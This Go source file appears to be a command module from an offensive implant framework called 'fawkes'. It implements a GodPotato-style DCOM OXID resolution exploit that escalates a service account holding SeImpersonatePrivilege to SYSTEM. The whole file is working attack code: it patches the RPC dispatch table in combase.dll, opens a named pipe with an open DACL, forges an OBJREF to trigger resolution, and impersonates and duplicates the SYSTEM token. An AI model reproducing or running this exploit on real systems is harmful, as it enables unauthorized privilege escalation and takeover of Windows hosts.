//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// GodPotato-style DCOM OXID resolution abuse for SeImpersonate → SYSTEM.
// This technique hooks the RPC dispatch table in combase.dll to redirect
// OXID resolution to an attacker-controlled named pipe. When RPCSS (SYSTEM)
// connects to resolve the OXID, we impersonate its token.
//
// References:
// - https://github.com/BeichenDream/GodPotato
// - https://github.com/tylerdotrar/SigmaPotato

// orcbGUID is the ORCB RPC interface GUID (18f70770-8e64-11cf-9af1-0020af6e72f4)
// in little-endian byte order for memory scanning in combase.dll.
var orcbGUID = [16]byte{
	0x70, 0x07, 0xF7, 0x18, // Data1 LE
	0x64, 0x8E,             // Data2 LE
	0xCF, 0x11,             // Data3 LE
	0x9A, 0xF1, 0x00, 0x20, 0xAF, 0x6E, 0x72, 0xF4, // Data4
}

// OBJREF magic signature ("MEOW" in little-endian)
const objrefSignature = 0x574f454d

// OBJREF flags
const objrefStandard = 0x00000001

// COM IIDs
var iidIUnknown = [16]byte{
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
}

// DUALSTRINGARRAY pointing to our named pipe
// Format: ncacn_np (tower 0x0F) + pipe path + security binding
func buildDualStringArray(pipeName string) []byte {
	// String binding: tower protocol (2 bytes) + pipe path (UTF-16) + null terminator
	// ncacn_np = 0x000F
	towerID := uint16(0x000F)
	pipePathUTF16 := utf16Encode(pipeName)
	stringBinding := make([]byte, 2+len(pipePathUTF16)*2+2) // tower + path + null
	binary.LittleEndian.PutUint16(stringBinding[0:2], towerID)
	for i, c := range pipePathUTF16 {
		binary.LittleEndian.PutUint16(stringBinding[2+i*2:4+i*2], c)
	}
	// null terminator for string binding
	stringBindingEnd := 2 + len(pipePathUTF16)*2 + 2
	stringBinding = stringBinding[:stringBindingEnd]

	// End of string bindings marker (2 null bytes)
	stringBinding = append(stringBinding, 0, 0)

	stringEntries := len(stringBinding) / 2

	// Security binding: AuthnSvc (2 bytes) + AuthzSvc (2 bytes) + PrincName null
	securityBinding := []byte{
		0x0A, 0x00, // AuthnSvc = RPC_C_AUTHN_WINNT (NTLM)
		0xFF, 0xFF, // AuthzSvc = 0xFFFF
		0x00, 0x00, // Empty principal name (null terminator)
	}
	// End of security bindings marker
	securityBinding = append(securityBinding, 0, 0)

	securityEntries := len(securityBinding) / 2
	totalEntries := stringEntries + securityEntries

	// Build DUALSTRINGARRAY header
	result := make([]byte, 4+totalEntries*2)
	binary.LittleEndian.PutUint16(result[0:2], uint16(totalEntries))
	binary.LittleEndian.PutUint16(result[2:4], uint16(stringEntries))
	copy(result[4:], stringBinding)
	copy(result[4+stringEntries*2:], securityBinding)

	return result
}

func utf16Encode(s string) []uint16 {
	result, _ := syscall.UTF16FromString(s)
	// Remove trailing null
	if len(result) > 0 && result[len(result)-1] == 0 {
		result = result[:len(result)-1]
	}
	return result
}

// potatoState holds the mutable state for the GodPotato technique
type potatoState struct {
	mu           sync.Mutex
	systemToken  windows.Token
	tokenCaptured bool
	pipeName     string
	hookError    string
	origFuncPtr  uintptr
}

var potatoGlobal potatoState

// Windows API procs for COM and memory operations
var (
	ole32DLL            = windows.NewLazySystemDLL("ole32.dll")
	procCoInitializeEx  = ole32DLL.NewProc("CoInitializeEx")
	procCoUninitialize  = ole32DLL.NewProc("CoUninitialize")
	procCoUnmarshalIntf = ole32DLL.NewProc("CoUnmarshalInterface")

	procVirtualQuery = kernel32NP.NewProc("VirtualQuery")
	// procGetModuleHandleW is declared in spawn.go
)

// RPC_SERVER_INTERFACE represents the RPC server interface structure in combase.dll
type rpcServerInterface struct {
	Length            uint32
	InterfaceID       [20]byte // RPC_IF_ID = GUID (16) + Version (4)
	TransferSyntax    [20]byte
	DispatchTable     uintptr  // *RPC_DISPATCH_TABLE
	RpcProtseqEndpointCount uint32
	RpcProtseqEndpoint uintptr
	DefaultManagerEpv  uintptr
	InterpreterInfo    uintptr // *MIDL_SERVER_INFO
	Flags             uint32
}

type rpcDispatchTable struct {
	DispatchTableCount uint32
	DispatchTable      uintptr // *funcptr array
	Reserved           uintptr
}

type midlServerInfo struct {
	StubDesc       uintptr
	DispatchTable  uintptr // *funcptr array — same as RPC dispatch
	ProcString     uintptr
	FmtStringOffset uintptr
}

// getSystemViaPotato implements the GodPotato DCOM OXID resolution exploit.
func getSystemViaPotato(oldIdentity string) structs.CommandResult {
	// Phase 0: Check SeImpersonatePrivilege
	if !checkPrivilege("SeImpersonatePrivilege") {
		return structs.CommandResult{
			Output:    "SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).",
			Status:    "error",
			Completed: true,
		}
	}

	// Phase 1: Find combase.dll and scan for ORCB RPC interface
	combaseBase, combaseSize, err := findModuleInfo("combase.dll")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to find combase.dll: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	rpcIfaceAddr, err := scanForGUID(combaseBase, combaseSize, orcbGUID[:])
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to find ORCB RPC interface in combase.dll: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Phase 2: Parse RPC structures and locate UseProtSeq dispatch entry
	rpcIface := (*rpcServerInterface)(unsafe.Pointer(rpcIfaceAddr))
	if rpcIface.DispatchTable == 0 {
		return structs.CommandResult{
			Output:    "RPC_SERVER_INTERFACE dispatch table pointer is null",
			Status:    "error",
			Completed: true,
		}
	}

	dispTable := (*rpcDispatchTable)(unsafe.Pointer(rpcIface.DispatchTable))
	if dispTable.DispatchTable == 0 || dispTable.DispatchTableCount == 0 {
		return structs.CommandResult{
			Output:    "RPC dispatch table is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// UseProtSeq is at index 0 in the MIDL_SERVER_INFO dispatch table
	midlInfo := (*midlServerInfo)(unsafe.Pointer(rpcIface.InterpreterInfo))
	if midlInfo == nil || midlInfo.DispatchTable == 0 {
		return structs.CommandResult{
			Output:    "MIDL_SERVER_INFO dispatch table is null",
			Status:    "error",
			Completed: true,
		}
	}

	// Read the original UseProtSeq function pointer (index 0)
	useProtSeqSlot := midlInfo.DispatchTable
	origFunc := *(*uintptr)(unsafe.Pointer(useProtSeqSlot))
	potatoGlobal.origFuncPtr = origFunc

	// Phase 3: Create named pipe server
	pipeName := fmt.Sprintf(`\\.\pipe\fawkes_%d\pipe\epmapper`, time.Now().UnixNano()%100000)
	potatoGlobal.pipeName = pipeName
	potatoGlobal.tokenCaptured = false
	potatoGlobal.systemToken = 0

	// Create the pipe with permissive DACL
	sd, sdErr := windows.NewSecurityDescriptor()
	if sdErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("NewSecurityDescriptor: %v", sdErr),
			Status:    "error",
			Completed: true,
		}
	}
	if err := sd.SetDACL(nil, true, false); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("SetDACL: %v", sdErr),
			Status:    "error",
			Completed: true,
		}
	}

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      0,
	}

	pipeNamePtr, _ := windows.UTF16PtrFromString(pipeName)
	hPipe, _, pipeErr := procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(pipeNamePtr)),
		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		PIPE_BUFFER_SIZE,
		PIPE_BUFFER_SIZE,
		0,
		uintptr(unsafe.Pointer(&sa)),
	)
	if hPipe == uintptr(windows.InvalidHandle) {
		return structs.CommandResult{
			Output:    fmt.Sprintf("CreateNamedPipe(%s): %v", pipeName, pipeErr),
			Status:    "error",
			Completed: true,
		}
	}
	pipeHandle := windows.Handle(hPipe)
	defer windows.CloseHandle(pipeHandle)

	// Start async ConnectNamedPipe
	event, _ := windows.CreateEvent(nil, 1, 0, nil)
	defer windows.CloseHandle(event)

	var overlapped windows.Overlapped
	overlapped.HEvent = event
	procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))

	// Phase 4: Hook UseProtSeq to return our pipe binding
	// Extract pipe path component for the DUALSTRINGARRAY
	// The DUALSTRINGARRAY string binding needs just the pipe path without \\.\pipe\ prefix
	pipeShortName := strings.TrimPrefix(pipeName, `\\.\pipe\`)

	hookCallback := syscall.NewCallback(makeUseProtSeqHook(pipeShortName))

	// Make the dispatch table writable
	var oldProtect uint32
	err = windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("VirtualProtect on dispatch table: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Replace the function pointer
	*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = hookCallback

	// Restore protection (best effort)
	defer func() {
		*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = origFunc
		windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), oldProtect, &oldProtect)
	}()

	// Phase 5: Initialize COM and trigger OXID resolution
	procCoInitializeEx.Call(0, 0) // COINIT_MULTITHREADED = 0
	defer procCoUninitialize.Call()

	// Construct OBJREF manually and trigger CoUnmarshalInterface
	triggerErr := triggerOXIDResolution()

	// Phase 6: Wait for pipe connection (SYSTEM connecting)
	waitResult, _ := windows.WaitForSingleObject(event, 10000) // 10s timeout
	if waitResult != windows.WAIT_OBJECT_0 {
		errMsg := fmt.Sprintf("RPCSS did not connect to pipe within timeout.\nPipe: %s", pipeName)
		if triggerErr != nil {
			errMsg += fmt.Sprintf("\nTrigger error: %v", triggerErr)
		}
		return structs.CommandResult{
			Output:    errMsg,
			Status:    "error",
			Completed: true,
		}
	}

	// Phase 7: Impersonate the SYSTEM token
	ret, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
	if ret == 0 {
		procDisconnectNamedPipe.Call(hPipe)
		return structs.CommandResult{
			Output:    fmt.Sprintf("ImpersonateNamedPipeClient: %v", impErr),
			Status:    "error",
			Completed: true,
		}
	}

	clientIdentity, _ := GetCurrentIdentity()

	// Capture thread token
	var threadToken windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
	if err != nil {
		err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
	}
	if err != nil {
		procRevertToSelf.Call()
		procDisconnectNamedPipe.Call(hPipe)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Connected as %s but failed to capture token: %v", clientIdentity, err),
			Status:    "error",
			Completed: true,
		}
	}

	// Duplicate to primary token
	var dupToken windows.Token
	err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
		windows.SecurityDelegation, windows.TokenPrimary, &dupToken)
	if err != nil {
		err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
			windows.SecurityImpersonation, windows.TokenImpersonation, &dupToken)
	}
	threadToken.Close()

	if err != nil {
		procRevertToSelf.Call()
		procDisconnectNamedPipe.Call(hPipe)
		return structs.CommandResult{
			Output:    fmt.Sprintf("Connected as %s but DuplicateTokenEx: %v", clientIdentity, err),
			Status:    "error",
			Completed: true,
		}
	}

	procRevertToSelf.Call()
	procDisconnectNamedPipe.Call(hPipe)

	// Store token
	if setErr := SetIdentityToken(dupToken); setErr != nil {
		windows.CloseHandle(windows.Handle(dupToken))
		return structs.CommandResult{
			Output:    fmt.Sprintf("Connected as %s but SetIdentityToken: %v", clientIdentity, setErr),
			Status:    "error",
			Completed: true,
		}
	}

	newIdentity, _ := GetCurrentIdentity()

	var sb strings.Builder
	sb.WriteString("=== GETSYSTEM SUCCESS (DCOM/Potato) ===\n\n")
	sb.WriteString(fmt.Sprintf("Technique: DCOM OXID resolution hook (GodPotato)\n"))
	sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipeName))
	if oldIdentity != "" {
		sb.WriteString(fmt.Sprintf("Old: %s\n", oldIdentity))
	}
	sb.WriteString(fmt.Sprintf("New: %s\n", newIdentity))
	sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// findModuleInfo returns the base address and size of a loaded DLL.
func findModuleInfo(moduleName string) (uintptr, uintptr, error) {
	namePtr, err := windows.UTF16PtrFromString(moduleName)
	if err != nil {
		return 0, 0, err
	}

	handle, _, callErr := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(namePtr)))
	if handle == 0 {
		return 0, 0, fmt.Errorf("GetModuleHandle(%s): %v", moduleName, callErr)
	}

	// Query memory region to get the full module size
	type memoryBasicInformation struct {
		BaseAddress       uintptr
		AllocationBase    uintptr
		AllocationProtect uint32
		PartitionID       uint16
		_                 uint16
		RegionSize        uintptr
		State             uint32
		Protect           uint32
		Type              uint32
	}

	var mbi memoryBasicInformation
	ret, _, _ := procVirtualQuery.Call(handle, uintptr(unsafe.Pointer(&mbi)), unsafe.Sizeof(mbi))
	if ret == 0 {
		return handle, 0x1000000, nil // Default 16MB scan range
	}

	// Walk regions to find total module size
	totalSize := mbi.RegionSize
	addr := handle + mbi.RegionSize
	for {
		ret, _, _ = procVirtualQuery.Call(addr, uintptr(unsafe.Pointer(&mbi)), unsafe.Sizeof(mbi))
		if ret == 0 || mbi.AllocationBase != handle {
			break
		}
		totalSize += mbi.RegionSize
		addr += mbi.RegionSize
	}

	return handle, totalSize, nil
}

// scanForGUID scans module memory for the ORCB RPC interface GUID.
// Returns the address of the RPC_SERVER_INTERFACE structure that contains this GUID.
func scanForGUID(base, size uintptr, pattern []byte) (uintptr, error) {
	// The GUID appears at offset 4 in RPC_SERVER_INTERFACE (after the Length field)
	mem := unsafe.Slice((*byte)(unsafe.Pointer(base)), int(size))

	for i := 0; i <= len(mem)-len(pattern)-4; i++ {
		// Check at offset i+4 (GUID is after uint32 Length field)
		match := true
		for j := 0; j < len(pattern); j++ {
			if mem[i+4+j] != pattern[j] {
				match = false
				break
			}
		}
		if match {
			return base + uintptr(i), nil
		}
	}

	return 0, fmt.Errorf("ORCB GUID pattern not found in %d bytes of combase.dll", size)
}

// makeUseProtSeqHook creates the hooked UseProtSeq callback function.
// This returns a DUALSTRINGARRAY pointing to our named pipe.
func makeUseProtSeqHook(pipeShortName string) func(a1, a2, a3, a4, a5, a6 uintptr) uintptr {
	dsArray := buildDualStringArray(pipeShortName)

	return func(a1, a2, a3, a4, a5, a6 uintptr) uintptr {
		// The UseProtSeq callback receives the DUALSTRINGARRAY output pointer
		// as one of its parameters. The exact parameter depends on Windows version.
		// We need to write our DUALSTRINGARRAY to the output buffer.
		//
		// In practice, the 3rd or 4th parameter is the output pointer.
		// We try writing to a3 first (most common on x64 Win10+).
		if a3 != 0 {
			// Write DUALSTRINGARRAY size first, then copy data
			dst := unsafe.Slice((*byte)(unsafe.Pointer(a3)), len(dsArray))
			copy(dst, dsArray)
		}
		return 0 // Success
	}
}

// triggerOXIDResolution constructs an OBJREF and calls CoUnmarshalInterface
// to trigger OXID resolution through our hooked UseProtSeq.
func triggerOXIDResolution() error {
	// Build OBJREF manually
	// Structure: Signature(4) + Flags(4) + IID(16) + STDOBJREF + DUALSTRINGARRAY
	objref := buildOBJREF()

	// Create a minimal IStream wrapping our OBJREF bytes
	stream, streamRelease, err := createOBJREFStream(objref)
	if err != nil {
		return fmt.Errorf("create IStream: %w", err)
	}
	defer streamRelease()

	// Call CoUnmarshalInterface
	var punk uintptr
	ret, _, callErr := procCoUnmarshalIntf.Call(
		stream,
		uintptr(unsafe.Pointer(&iidIUnknown)),
		uintptr(unsafe.Pointer(&punk)),
	)

	// CoUnmarshalInterface may return an error (the fake object doesn't really exist),
	// but the important thing is that it triggered OXID resolution which hit our hook.
	if ret != 0 && punk == 0 {
		// This is expected — the unmarshaling triggers OXID resolution
		// even if the final interface creation fails
		return nil
	}

	if punk != 0 {
		// Release the interface if we somehow got one
		releaseVtbl := *(*uintptr)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(punk)) + 2*unsafe.Sizeof(uintptr(0))))
		syscall.SyscallN(releaseVtbl, punk)
	}

	_ = callErr
	return nil
}

// buildOBJREF constructs a standard OBJREF structure.
func buildOBJREF() []byte {
	buf := make([]byte, 0, 256)

	// Signature
	sig := make([]byte, 4)
	binary.LittleEndian.PutUint32(sig, objrefSignature)
	buf = append(buf, sig...)

	// Flags (Standard)
	flags := make([]byte, 4)
	binary.LittleEndian.PutUint32(flags, objrefStandard)
	buf = append(buf, flags...)

	// IID (IID_IUnknown)
	buf = append(buf, iidIUnknown[:]...)

	// STDOBJREF
	// Flags (4 bytes)
	stdobjFlags := make([]byte, 4)
	binary.LittleEndian.PutUint32(stdobjFlags, 0)
	buf = append(buf, stdobjFlags...)

	// PublicRefs (4 bytes)
	pubRefs := make([]byte, 4)
	binary.LittleEndian.PutUint32(pubRefs, 1)
	buf = append(buf, pubRefs...)

	// OXID (8 bytes) — use a random value
	oxid := make([]byte, 8)
	binary.LittleEndian.PutUint64(oxid, uint64(time.Now().UnixNano()))
	buf = append(buf, oxid...)

	// OID (8 bytes)
	oid := make([]byte, 8)
	binary.LittleEndian.PutUint64(oid, uint64(time.Now().UnixNano()+1))
	buf = append(buf, oid...)

	// IPID (16 bytes) — fake GUID
	ipid := [16]byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
		0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10}
	buf = append(buf, ipid[:]...)

	// DUALSTRINGARRAY — point to localhost via TCP (triggers OXID resolution)
	dsArray := buildResolverDualStringArray()
	buf = append(buf, dsArray...)

	return buf
}

// buildResolverDualStringArray creates a DUALSTRINGARRAY pointing to 127.0.0.1
// via TCP, which forces the COM runtime to do OXID resolution.
func buildResolverDualStringArray() []byte {
	// String binding: ncacn_ip_tcp (tower 0x07) + "127.0.0.1"
	towerID := uint16(0x0007) // ncacn_ip_tcp
	addr := utf16Encode("127.0.0.1")

	stringBinding := make([]byte, 0, 32)
	tb := make([]byte, 2)
	binary.LittleEndian.PutUint16(tb, towerID)
	stringBinding = append(stringBinding, tb...)
	for _, c := range addr {
		cb := make([]byte, 2)
		binary.LittleEndian.PutUint16(cb, c)
		stringBinding = append(stringBinding, cb...)
	}
	stringBinding = append(stringBinding, 0, 0) // null terminator
	stringBinding = append(stringBinding, 0, 0) // end of string bindings

	stringEntries := len(stringBinding) / 2

	// Security binding
	secBinding := []byte{0x0A, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00}
	secEntries := len(secBinding) / 2

	totalEntries := stringEntries + secEntries

	result := make([]byte, 4+totalEntries*2)
	binary.LittleEndian.PutUint16(result[0:2], uint16(totalEntries))
	binary.LittleEndian.PutUint16(result[2:4], uint16(stringEntries))
	copy(result[4:], stringBinding)
	copy(result[4+stringEntries*2:], secBinding)

	return result
}

// COM IStream vtable for wrapping OBJREF bytes.
// Minimal implementation — only Read needs real logic.

type iStreamImpl struct {
	vtbl    *iStreamVtbl
	refCount int32
	data    []byte
	pos     int
}

type iStreamVtbl struct {
	QueryInterface uintptr
	AddRef         uintptr
	Release        uintptr
	Read           uintptr
	Write          uintptr
	Seek           uintptr
	SetSize        uintptr
	CopyTo         uintptr
	Commit         uintptr
	Revert         uintptr
	LockRegion     uintptr
	UnlockRegion   uintptr
	Stat           uintptr
	Clone          uintptr
}

var (
	streamInstance *iStreamImpl
	streamVtblMu  sync.Mutex
)

func createOBJREFStream(objrefData []byte) (uintptr, func(), error) {
	streamVtblMu.Lock()
	defer streamVtblMu.Unlock()

	// Use SHCreateMemStream from shlwapi.dll as simpler alternative
	shlwapiDLL := windows.NewLazySystemDLL("shlwapi.dll")
	procSHCreateMemStream := shlwapiDLL.NewProc("SHCreateMemStream")

	if procSHCreateMemStream.Find() == nil {
		// Use SHCreateMemStream — much simpler than manual vtable
		stream, _, err := procSHCreateMemStream.Call(
			uintptr(unsafe.Pointer(&objrefData[0])),
			uintptr(len(objrefData)),
		)
		if stream == 0 {
			return 0, nil, fmt.Errorf("SHCreateMemStream: %v", err)
		}

		release := func() {
			// Call IUnknown::Release (vtable index 2)
			vtblPtr := *(*uintptr)(unsafe.Pointer(stream))
			releaseFunc := *(*uintptr)(unsafe.Pointer(vtblPtr + 2*unsafe.Sizeof(uintptr(0))))
			syscall.SyscallN(releaseFunc, stream)
		}

		return stream, release, nil
	}

	return 0, nil, fmt.Errorf("SHCreateMemStream not available")
}
